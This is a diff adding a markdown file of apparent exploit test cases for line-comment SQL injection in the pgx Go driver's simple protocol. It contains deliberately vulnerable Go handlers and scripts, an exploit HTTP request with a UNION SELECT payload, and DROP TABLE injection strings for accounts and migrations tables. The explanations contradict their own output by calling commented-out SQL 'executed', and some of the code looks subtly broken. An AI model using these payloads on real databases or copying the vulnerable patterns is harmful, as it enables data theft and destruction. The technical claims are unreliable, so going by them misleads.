@@ -1,0 +1,128 @@
+````md
+# pgx Line-Comment Injection – Exploitable Test Cases
+
+_These scenarios demonstrate SQL injection via line-comment creation in pgx versions < 4.18.2 when using the simple protocol._
+
+---
+
+## Test Case 1 – Web API Injection
+
+```go
+// server.go
+package main
+
+import (
+  "context"
+  "net/http"
+  "os"
+
+  "github.com/jackc/pgx/v4"
+)
+
+func main() {
+  ctx := context.Background()
+  config, _ := pgx.ParseConfig(os.Getenv("DATABASE_URL"))
+  // Enable simple protocol
+  config.PreferSimpleProtocol = true
+  conn, _ := pgx.ConnectConfig(ctx, config)
+
+  http.HandleFunc("/transfer", func(w http.ResponseWriter, r *http.Request) {
+    amt := r.URL.Query().Get("amount")
+    note := r.URL.Query().Get("note")
+    // Vulnerable: minus before placeholder + string placeholder on same line
+    conn.Exec(ctx,
+      "INSERT INTO transfers(amount,note) VALUES(-$1,$2);",
+      amt, note,
+    )
+  })
+  http.ListenAndServe(":8080", nil)
+}
+
+Exploit HTTP request:
+
+GET /transfer?amount=123&note=+--+UNION+SELECT+secret+FROM+users;-- HTTP/1.1
+Host: localhost:8080
+
+Constructed SQL (unpatched):
+
+INSERT INTO transfers(amount,note) VALUES(-123' -- UNION SELECT secret FROM users;--');
+
+The two dashes form --, starting a comment that injects the UNION payload.
+
+Test Case 2 – Standalone Go POC
+
+// poc.go
+package main
+
+import (
+  "context"
+  "fmt"
+  "os"
+
+  "github.com/jackc/pgx/v4"
+  "github.com/jackc/pgx/v4/internal/sanitize"
+)
+
+func main() {
+  ctx := context.Background()
+  config, _ := pgx.ParseConfig(os.Getenv("DATABASE_URL"))
+  config.PreferSimpleProtocol = true
+  conn, _ := pgx.ConnectConfig(ctx, config)
+
+  // Build a malicious query
+  raw := "SELECT * FROM accounts WHERE balance = -$1 AND note = $2;"
+  query, _ := sanitize.NewQuery(raw)
+  // $1 = positive -> no parentheses
+  // $2 begins with ' --' -> second dash
+  injectedSQL, _ := query.Sanitize(int64(500), " -- DROP TABLE accounts;--")
+
+  fmt.Println(injectedSQL)
+  // Execute injection
+  conn.Exec(ctx, injectedSQL)
+}
+
+Printed output (unpatched):
+
+SELECT * FROM accounts WHERE balance = -500' -- DROP TABLE accounts;--';
+
+Test Case 3 – CI/CD Migration Script
+
+# Set environment variable in CI
+export MIGRATION_NOTE=" -- DROP TABLE migrations;--"
+
+// migrate.go
+package main
+
+import (
+  "context"
+  "fmt"
+  "os"
+
+  "github.com/jackc/pgx/v4"
+)
+
+func main() {
+  ctx := context.Background()
+  config, _ := pgx.ParseConfig(os.Getenv("DATABASE_URL"))
+  config.PreferSimpleProtocol = true
+  conn, _ := pgx.ConnectConfig(ctx, config)
+
+  // Vulnerable call in migration tool
+  _, err := conn.SimpleQuery(ctx,
+    "CALL apply_migration($1, $2);",
+    "20250401",
+    os.Getenv("MIGRATION_NOTE"),
+  )
+  if err != nil {
+    fmt.Fprintln(os.Stderr, err)
+  }
+}
+
+Injected command (unpatched):
+
+CALL apply_migration('20250401', -- DROP TABLE migrations;--);
+
+which comments out the rest and executes the destructive DDL.
+
+Mitigation: Upgrade to pgx ≥ 4.18.2 or disable simple protocol. Ensure no minus sign directly precedes a placeholder followed by a string parameter on the same line.
+````
